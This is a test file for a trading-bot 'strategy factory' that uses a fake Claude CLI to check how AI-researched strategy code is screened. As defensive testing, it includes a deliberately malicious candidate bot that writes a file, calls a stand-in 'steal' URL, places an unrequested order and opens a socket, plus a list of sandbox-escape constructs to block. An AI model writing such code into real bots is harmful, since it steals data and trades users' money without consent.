"""Strategy factory research: a fake `claude` on the PATH answers with 5 candidate files, one of them malicious (a
network import, a file write, an order call). The malicious one is refused before anything runs, retried once,
never saved as a loadable .py; the rest go through the same honest pipeline. Without research (no claude, the Claude
panel off, not logged in) the factory falls back to its templates and says so."""
import json
import os
import stat
from urllib.error import HTTPError
from urllib.parse import urlparse
from urllib.request import Request, urlopen

import pytest

from botscope import console, demo, factory_research as fr, journal, loader, strategy_factory as sf, view

GOAL = "a swing bot for SPY and QQQ"

FAKE = r'''#!/usr/bin/env python3
import json, os, sys
prompt = sys.stdin.read()
log = os.environ["FAKE_CLAUDE_LOG"]
calls = json.load(open(log)) if os.path.exists(log) else []
calls.append({"argv": sys.argv[1:], "stdin": prompt})
json.dump(calls, open(log, "w"))
if os.environ.get("FAKE_CLAUDE_FAIL"):
    sys.stderr.write(os.environ["FAKE_CLAUDE_FAIL"]); sys.exit(1)
answers = json.load(open(os.environ["FAKE_CLAUDE_ANSWERS"]))
answer = answers["retry"] if "were refused" in prompt else answers["first"]
out = lambda e: print(json.dumps(e), flush=True)
out({"type": "system", "subtype": "init", "session_id": "r-1"})
out({"type": "stream_event", "event": {"type": "content_block_start", "content_block": {"type": "server_tool_use", "name": "web_search"}}})
text = json.dumps(answer)
for i in range(0, len(text), 400):
    out({"type": "stream_event", "event": {"type": "content_block_delta", "delta": {"type": "input_json_delta", "partial_json": text[i:i + 400]}}})
out({"type": "result", "is_error": False, "result": "", "structured_output": answer})
'''

MARKER = "SHOULD_NEVER_EXIST"


def _good(key):
    spec = sf.understand(GOAL)
    _, code = sf.source(key, spec, "0101120000")
    t = sf.TEMPLATES[key]
    return {"name": t["name"] + " researched", "idea": t["description"], "source": f"Textbook idea, https://example.org/{key}",
            "why_it_fits": "daily, long only", "code": code}


def _evil(marker_dir, how="all"):
    code = f'''"""Looks like a bot."""
import urllib.request
from botscope.bot import Bot, Entry, Exit, NoTrade
open({str(marker_dir / MARKER)!r}, "w").write("ran")


class Evil(Bot):
    name = "Evil"
    rules = ["buy"]
    timeframe = "1Day"
    params = {{}}

    def entry(self, view):
        urllib.request.urlopen("https://example.com/steal")
        self.broker.place_order("SPY", 100)
        return NoTrade("x")
'''
    if how == "socket":
        code = "import socket\nfrom botscope.bot import Bot\n\nclass Sneaky(Bot):\n    name = 'S'\n    def entry(self, view):\n        return socket.create_connection(('example.com', 80))\n"
    return {"name": "Free money", "idea": "trust me", "source": "a forum", "why_it_fits": "it's great", "code": code}


@pytest.fixture
def fake(tmp_path, monkeypatch):
    monkeypatch.setenv("BOTSCOPE_FACTORY_DIR", str(tmp_path / "factory"))
    monkeypatch.setenv("BOTSCOPE_BOTS_DIR", str(tmp_path / "bots"))
    (tmp_path / "bots").mkdir()
    exe = tmp_path / "bin" / "claude"
    exe.parent.mkdir()
    exe.write_text(FAKE)
    exe.chmod(exe.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setenv("PATH", f"{exe.parent}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_CLAUDE_LOG", str(tmp_path / "calls.json"))
    monkeypatch.setenv("FAKE_CLAUDE_ANSWERS", str(tmp_path / "answers.json"))
    console.STATE["on"] = True
    yield tmp_path
    console.STATE["on"] = False


def _answers(tmp, first, retry=None):
    (tmp / "answers.json").write_text(json.dumps({"first": {"candidates": first}, "retry": {"candidates": retry or []}}))


def _calls(tmp):
    return json.loads((tmp / "calls.json").read_text())


def _fast_judge(monkeypatch):
    """Every loaded candidate 'survives' instantly; this file tests research, not the backtests."""
    seen = []

    def judge(cls, spec, fetch=None):
        seen.append(cls.name)
        return {"kept": True, "confidence": "low", "confidence_step": 1, "confidence_why": [], "untested_trades": 40,
                "if_costs_doubled_r": 1.0, "avg_r": 0.1, "without_best_3_r": 0.5, "luck": "probably not luck",
                "untested_years": 9, "years_beat_spy": 4, "_entries": []}
    monkeypatch.setattr(sf, "judge", judge)
    return seen


# ---------------------------------------------------------------- reading a file before running any of it

@pytest.mark.parametrize("code", [
    "import os\n", "import socket\n", "from urllib import request\n", "import subprocess\n", "from botscope import brokers\n",
    "from botscope.guard import x\n", "from . import x\n",
    "def f():\n    return open('x', 'w')\n", "def f():\n    return eval('1')\n", "def f():\n    return __import__('os')\n",
    "def f(x):\n    return getattr(x, 'y')\n", "def f(x):\n    return x.__class__.__subclasses__()\n",
    "def f(x):\n    return '{0.__globals__}'.format(x)\n", "def f(api):\n    return api.submit_order('SPY')\n",
    "def f(c):\n    return c.place_stock_order()\n", "while True:\n    pass\n", "print('hi')\n",
    "class A:\n    import os\n", "class A:\n    for i in range(3):\n        pass\n",
])
def test_scan_refuses_what_a_bot_never_needs(code):
    assert fr.scan(code)


def test_scan_accepts_every_example_and_template():
    for key, t in sf.TEMPLATES.items():
        spec = {**sf.understand("a daily bot" if t["timeframe"] == "1Day" else "an intraday bot"), "sides": t["sides"][0]}
        assert fr.scan(sf.source(key, spec, "0101120000")[1]) == [], key
    for f in (sf.ROOT / "bots").glob("*.py"):
        assert fr.scan(f.read_text()) == [], f.name


# ---------------------------------------------------------------- research with a fake claude

def test_research_writes_five_refuses_the_malicious_one_and_retries_it(fake, monkeypatch):
    seen = _fast_judge(monkeypatch)
    _answers(fake, [_good("dip_buy"), _good("band_reversion"), _evil(fake), _good("trend_ride"), _good("momentum_hold")],
             retry=[_good("quiet_breakout")])
    out = sf.run(GOAL, research=True, demo=True)
    assert out["research"]["used"] and out["tried"] == 5 and len(out["kept"]) == 5 and not out["dropped"]
    assert not (fake / MARKER).exists()                                         # the malicious file never ran
    folder = sf.factory_dir() / out["run"]
    assert len(list(folder.glob("*.py"))) == 5 and not list(folder.glob("*evil*")) and not list(folder.glob("*free_money*.py"))
    assert all("researched" in n for n in seen) and "Quiet-day breakout researched" in " ".join(seen)
    for k in out["kept"]:
        assert k["idea_source"].startswith("Textbook idea, https://example.org/") and k["idea"]
        assert loader.bot_id(sf.load_file(sf.Path(k["file"]))) == k["id"]     # opens as factory/<run>/<id>
        assert sf.Path(k["file"]).read_text().startswith("# Researched by your own Claude Code")
    calls = _calls(fake)
    assert len(calls) == 2 and "were refused" in calls[1]["stdin"] and "imports urllib.request" in calls[1]["stdin"]
    argv = calls[0]["argv"]
    assert GOAL not in argv                                                     # the prompt goes on stdin only
    assert GOAL in calls[0]["stdin"] and "['SPY', 'QQQ']" in calls[0]["stdin"] and "Source" in calls[0]["stdin"]
    hooks = json.loads(argv[argv.index("--settings") + 1])["hooks"]["PreToolUse"]
    assert hooks[0]["matcher"] == console.ORDER_MATCHER                        # the live-order guard rides along
    assert argv[argv.index("--tools") + 1] == "WebSearch,WebFetch" and "--strict-mcp-config" in argv   # no broker tools
    assert "--json-schema" in argv
    assert "Source of the idea" in out["markdown"] and "Research only picks the ideas" in out["markdown"]
    assert journal.load("factory_runs")[-1]["research"]["used"] is True
    assert "5 candidates were tried" in out["tries_note"]                       # research doesn't change the honesty note


def test_a_candidate_refused_twice_is_dropped_untested_and_never_loadable(fake, monkeypatch):
    seen = _fast_judge(monkeypatch)
    _answers(fake, [_good("dip_buy"), _evil(fake), _good("trend_ride"), _good("band_reversion"), _good("momentum_hold")],
             retry=[_evil(fake, "socket")])
    out = sf.run(GOAL, research=True, demo=True)
    assert out["tried"] == 5 and len(out["kept"]) == 4 and len(seen) == 4
    d = out["dropped"][0]
    assert d["step"] == "safety check" and d["reason"].startswith("refused before testing")
    assert "socket" in d["reason"] and "first try" in d["reason"] and d["file"] is None
    folder = sf.factory_dir() / out["run"]
    assert not (fake / MARKER).exists() and len(list(folder.glob("*.py"))) == 4
    assert list(folder.glob("*.refused.txt"))                                  # kept to read, never to run
    with pytest.raises(KeyError):
        loader.get(f"factory/{out['run']}/{d['id']}")
    assert "1 refused before testing" in out["research"]["note"]


def test_the_honest_pipeline_still_drops_bad_research(fake):
    """A researched candidate that passes the safety scan still has to survive the real tests on demo data."""
    bad = _good("dip_buy")
    bad["code"] = bad["code"].replace('Entry("long", closes[-1] - self.p["stop_ranges"] * rng',
                                      'Entry("long", closes[-1] - 0.0001 * rng')            # a stop too tight to trust
    _answers(fake, [bad, _good("trend_ride"), _good("band_reversion"), _good("momentum_hold"), _good("quiet_breakout")])
    out = sf.run(GOAL, research=True, fetch=demo.bars, demo=True)
    assert out["tried"] == 5 == len(out["kept"]) + len(out["dropped"])
    assert out["dropped"] and all(d["reason"] for d in out["dropped"])
    assert any(d["name"].startswith("Dip buy researched") for d in out["dropped"])
    for k in out["kept"]:
        assert k["untested_trades"] >= 30 and k["if_costs_doubled_r"] > 0


# ---------------------------------------------------------------- falling back to the templates

def _templates_used(out):
    assert out["research"]["used"] is False and "textbook templates" in out["research"]["note"]
    assert out["tried"] >= 1 and all(r["template"] in sf.TEMPLATES for r in out["kept"] + out["dropped"])
    assert out["research"]["note"] in out["markdown"]


def test_falls_back_without_the_claude_command(fake, monkeypatch, tmp_path):
    _fast_judge(monkeypatch)
    monkeypatch.setenv("PATH", str(tmp_path / "empty"))
    out = sf.run(GOAL, research=True, demo=True)
    _templates_used(out)
    assert "isn't installed" in out["research"]["note"]


def test_falls_back_when_the_claude_panel_is_off(fake, monkeypatch):
    _fast_judge(monkeypatch)
    console.STATE["on"] = False
    out = sf.run(GOAL, research=True, demo=True)
    _templates_used(out)
    assert "switched off" in out["research"]["note"] and not (fake / "calls.json").exists()


def test_falls_back_when_claude_is_not_logged_in(fake, monkeypatch):
    _fast_judge(monkeypatch)
    monkeypatch.setenv("FAKE_CLAUDE_FAIL", "Invalid API key · Please run /login")
    out = sf.run(GOAL, research=True, demo=True)
    _templates_used(out)
    assert "Please run /login" in out["research"]["note"] and "log in" in out["research"]["note"]


def test_falls_back_when_every_candidate_is_refused(fake, monkeypatch):
    _fast_judge(monkeypatch)
    _answers(fake, [_evil(fake)] * 5, retry=[_evil(fake, "socket")] * 5)
    out = sf.run(GOAL, research=True, demo=True)
    _templates_used(out)
    assert "every researched candidate was refused" in out["research"]["note"] and not (fake / MARKER).exists()


# ---------------------------------------------------------------- the Studio route

def _req(path, body, token=True, origin="same"):
    base = view.ensure_server()
    h = {"Content-Type": "application/json"}
    if token:
        h["X-BotScope-Token"] = console.TOKEN
    if origin:
        h["Origin"] = base if origin == "same" else origin
    try:
        r = urlopen(Request(base + path, data=json.dumps(body).encode(), headers=h), timeout=60)
        return r.status, json.loads(r.read())
    except HTTPError as e:
        return e.code, json.loads(e.read())


def test_research_route_uses_the_console_rules(fake, monkeypatch):
    _fast_judge(monkeypatch)
    _answers(fake, [_good(k) for k in ("dip_buy", "band_reversion", "trend_ride", "momentum_hold", "quiet_breakout")])
    assert _req("/api/factory/research", {"goal": GOAL}, token=False)[0] == 403
    assert _req("/api/factory/research", {"goal": GOAL}, origin="http://evil.example")[0] == 403
    assert _req("/api/factory/research", {"goal": GOAL}, origin=None)[0] == 403
    console.STATE["on"] = False
    code, body = _req("/api/factory/research", {"goal": GOAL})
    assert code == 403 and body["offer"] == "templates" and not (fake / "calls.json").exists()
    console.STATE["on"] = True
    code, body = _req("/api/factory/research", {"goal": GOAL})
    assert code == 200 and body["research"]["used"] and body["tried"] == 5


def test_factory_js_is_served_and_the_page_loads_it():
    base = view.ensure_server()
    js = urlopen(base + "/factory.js").read()
    assert b"factoryShell" in js and b"/api/factory/research" in js and b"X-BotScope-Token" not in js   # uses Studio's H()
    assert b'<script src="/factory.js"></script>' in urlopen(base + "/studio").read()
    assert urlparse(base).hostname == "127.0.0.1"
